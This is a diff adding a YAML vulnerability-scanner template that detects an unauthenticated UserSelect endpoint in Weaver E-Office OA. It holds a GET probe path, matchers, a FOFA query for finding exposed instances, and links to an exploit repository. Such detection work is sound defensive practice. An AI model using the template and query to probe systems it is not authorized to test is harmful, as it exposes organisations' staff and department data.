@@ -1,0 +1,36 @@
+http:
+- matchers:
+  - condition: and
+    type: word
+    words:
+    - "<title>\u9009\u62E9\u4EBA\u5458</title>"
+    - /UserSelect/dept.php
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/UserSelect/'
+id: weaver-userselect-unauth
+info:
+  author: SleepingBag945
+  classification:
+    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
+  description: 'OA E-Office UserSelect interface has an unauthorized access vulnerability,
+    through which attackers can obtain sensitive information
+
+    '
+  metadata:
+    fofa-query: "app=\"\u6CDB\u5FAE-EOffice\""
+    max-request: 1
+    product: e-office
+    vendor: weaver
+    verified: true
+  name: OA E-Office UserSelect Unauthorized Access
+  reference:
+  - https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/WeaverEOfficeController.java
+  - "http://wiki.peiqi.tech/wiki/oa/\u6CDB\u5FAEOA/\u6CDB\u5FAEOA%20E-Office%20UserSelect%20\u672A\
+    \u6388\u6743\u8BBF\u95EE\u6F0F\u6D1E.html"
+  severity: high
+  tags: weaver,e-office,oa,unauth,vuln
